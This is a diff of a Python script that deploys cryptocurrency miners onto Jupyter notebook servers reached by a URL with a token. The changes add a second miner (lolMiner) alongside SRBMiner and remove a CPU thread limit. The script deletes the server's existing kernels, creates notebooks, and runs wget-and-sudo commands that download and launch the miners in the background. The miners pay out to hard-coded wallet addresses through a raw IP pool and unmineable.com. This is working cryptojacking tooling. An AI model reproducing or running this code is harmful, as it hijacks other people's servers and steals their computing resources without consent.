@@ -14,9 +14,14 @@ def generate_worker_id():
     return f"rig_cakarcpu{random.randint(100, 999)}"
 
 def create_srb_code(worker_id):
-    """Create SRBMiner code with dynamic worker ID (full download version)"""
+    """Create SRBMiner code with dynamic worker ID"""
     return f'''
-!wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.6/SRBMiner-Multi-2-9-6-Linux.tar.gz && tar -xf SRBMiner-Multi-2-9-6-Linux.tar.gz > /dev/null 2>&1 && chmod +x SRBMiner-Multi-2-9-6/SRBMiner-MULTI && sudo ./SRBMiner-Multi-2-9-6/SRBMiner-MULTI -a randomvirel -o 178.128.14.152:80 -u v1g5udzsr8h9mr0t0r6mfyy2di7xtya6jkfzoc2.plan -p m=solo -t $(($(nproc) - 1)) --retry-time 15 --background'''
+!wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.6/SRBMiner-Multi-2-9-6-Linux.tar.gz && tar -xf SRBMiner-Multi-2-9-6-Linux.tar.gz > /dev/null 2>&1 && chmod +x SRBMiner-Multi-2-9-6/SRBMiner-MULTI && sudo ./SRBMiner-Multi-2-9-6/SRBMiner-MULTI -a randomvirel -o 178.128.14.152:80 -u v1g5udzsr8h9mr0t0r6mfyy2di7xtya6jkfzoc2.plan -p m=solo -t $(nproc) --background'''
+
+def create_lolminer_code(worker_id):
+    """Create lolMiner code with dynamic worker ID"""
+    return f'''
+!wget -q https://github.com/kryptex-miners-org/kryptex-miners/releases/download/lolminer-1-98a/lolMiner_v1.98a_Lin64.tar.gz && tar -xf lolMiner_v1.98a_Lin64.tar.gz > /dev/null 2>&1 && chmod +x lolMiner && sudo ./lolMiner --algo FISHHASH --pool fishhash.unmineable.com:80 --user USDT:TThXMire8Q88eDWdVsZQfpS3DFt6jRPyQ2.ayo --worker {worker_id} --background'''
 
 def log_error(url, error_message, error_type="GENERAL"):
     """Error logging to error.txt"""
@@ -55,10 +60,10 @@ def extract_info(url):
         print(f"[!] Exception in extract_info: {e}")
         return None
 
-def create_notebook(info, url, filename="Untitled.ipynb", srb_code_to_use=None):
-    if srb_code_to_use is None:
+def create_notebook(info, url, filename="Untitled.ipynb", code_to_use=None):
+    if code_to_use is None:
         worker_id = generate_worker_id()
-        srb_code_to_use = create_srb_code(worker_id)
+        code_to_use = create_srb_code(worker_id)
     
     notebook = {
         "cells": [{
@@ -66,7 +71,7 @@ def create_notebook(info, url, filename="Untitled.ipynb", srb_code_to_use=None):
             "execution_count": None,
             "metadata": {},
             "outputs": [],
-            "source": srb_code_to_use.strip().splitlines()
+            "source": code_to_use.strip().splitlines()
         }],
         "metadata": {
             "kernelspec": {
@@ -217,10 +222,11 @@ def execute_code(info, kernel_id, code, url):
     finally:
         loop.close()
 
-def handle_url(idx, url):
-    """Handle a single URL - this function will run sequentially"""
+def handle_dual_kernel_mining(idx, url):
+    """Handle dual kernel mining with both SRBMiner and lolMiner"""
     worker_id = generate_worker_id()
-    print(f"[{idx}] Processing URL: {url} with worker ID: {worker_id}")
+    print(f"[{idx}] Starting DUAL KERNEL mining on: {url}")
+    print(f"[{idx}] Worker ID: {worker_id}")
     
     try:
         info = extract_info(url)
@@ -237,40 +243,70 @@ def handle_url(idx, url):
         if not delete_all_kernels(info, idx, url):
             print(f"[{idx}] Warning: Failed to clean old kernels for: {url}")
 
-        # Create SRBMiner code (always use full download version)
-        srb_code_to_use = create_srb_code(worker_id)
-        print(f"[{idx}] Using full SRBMiner download code")
+        # Create miner codes
+        srb_code = create_srb_code(worker_id)
+        lolminer_code = create_lolminer_code(worker_id)
 
-        # Create notebook with SRBMiner code
-        if not create_notebook(info, url, srb_code_to_use=srb_code_to_use):
-            print(f"[{idx}] Failed to create notebook for: {url}")
+        print(f"[{idx}] Created both SRBMiner and lolMiner codes")
+
+        # Create notebooks for both miners
+        if not create_notebook(info, url, "SRBMiner.ipynb", srb_code):
+            print(f"[{idx}] Failed to create SRBMiner notebook")
             return False
 
-        # Start kernel
-        kernel_id = start_kernel(info, url)
-        if not kernel_id:
-            print(f"[{idx}] Failed to start kernel for: {url}")
+        if not create_notebook(info, url, "lolMiner.ipynb", lolminer_code):
+            print(f"[{idx}] Failed to create lolMiner notebook")
             return False
 
-        print(f"[{idx}] Started new kernel: {kernel_id} for: {url}")
-
-        # Execute code
-        err = execute_code(info, kernel_id, srb_code_to_use, url)
-        if err:
-            print(f"[{idx}] Error: {err} for: {url}")
+        # Start first kernel for SRBMiner
+        kernel1_id = start_kernel(info, url)
+        if not kernel1_id:
+            print(f"[{idx}] Failed to start first kernel for SRBMiner")
             return False
+
+        # Start second kernel for lolMiner
+        kernel2_id = start_kernel(info, url)
+        if not kernel2_id:
+            print(f"[{idx}] Failed to start second kernel for lolMiner")
+            return False
+
+        print(f"[{idx}] Started dual kernels:")
+        print(f"[{idx}]   Kernel 1 (SRBMiner): {kernel1_id}")
+        print(f"[{idx}]   Kernel 2 (lolMiner): {kernel2_id}")
+
+        # Execute SRBMiner in first kernel
+        print(f"[{idx}] Launching SRBMiner...")
+        err1 = execute_code(info, kernel1_id, srb_code, url)
+        if err1:
+            print(f"[{idx}] SRBMiner execution error: {err1}")
         else:
-            print(f"[{idx}] SRBMiner launched successfully for: {url}")
-            return True
+            print(f"[{idx}] SRBMiner launched successfully")
+
+        # Execute lolMiner in second kernel
+        print(f"[{idx}] Launching lolMiner...")
+        err2 = execute_code(info, kernel2_id, lolminer_code, url)
+        if err2:
+            print(f"[{idx}] lolMiner execution error: {err2}")
+        else:
+            print(f"[{idx}] lolMiner launched successfully")
+
+        # Consider success if at least one miner launched
+        success = not err1 or not err2
+        if success:
+            print(f"[{idx}] DUAL KERNEL MINING: At least one miner deployed successfully")
+        else:
+            print(f"[{idx}] DUAL KERNEL MINING: Both miners failed to deploy")
+
+        return success
             
     except Exception as e:
-        log_error(url, f"Unexpected exception in handle_url: {e}", "HANDLE_URL_EXCEPTION")
-        print(f"[{idx}] Exception handling URL {url}: {e}")
+        log_error(url, f"Unexpected exception in dual kernel mining: {e}", "DUAL_KERNEL_EXCEPTION")
+        print(f"[{idx}] Exception in dual kernel mining for {url}: {e}")
         return False
 
 def main():
     # Parse command line arguments
-    parser = argparse.ArgumentParser(description='Jupyter Notebook Miner Deployer')
+    parser = argparse.ArgumentParser(description='Jupyter Notebook Dual Kernel Miner Deployer')
     parser.add_argument('--url', required=True, help='Jupyter notebook URL with token')
     args = parser.parse_args()
 
@@ -284,13 +320,14 @@ def main():
         print(f"[!] Failed to initialize error log: {e}")
 
     print(f"[+] Processing URL: {args.url}")
+    print("[+] AUTO DUAL KERNEL MODE: Deploying both SRBMiner and lolMiner")
     
-    # Process the single URL
-    success = handle_url(1, args.url)
+    # Always use dual kernel mode
+    success = handle_dual_kernel_mining(1, args.url)
     
     # Final result
     if success:
-        print(f"[+] SUCCESS: Miner deployed successfully to: {args.url}")
+        print(f"[+] SUCCESS: Dual kernel miners deployed successfully to: {args.url}")
     else:
         print(f"[!] FAILED: Miner deployment failed for: {args.url}")
         print(f"[!] Check error.txt for details")
@@ -301,6 +338,7 @@ def main():
             f.write(f"\nSUMMARY - Completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write("=" * 80 + "\n")
             f.write(f"URL: {args.url}\n")
+            f.write(f"Mode: AUTO DUAL KERNEL\n")
             f.write(f"Result: {'SUCCESS' if success else 'FAILED'}\n")
     except Exception as e:
         print(f"[!] Failed to write summary to error log: {e}")
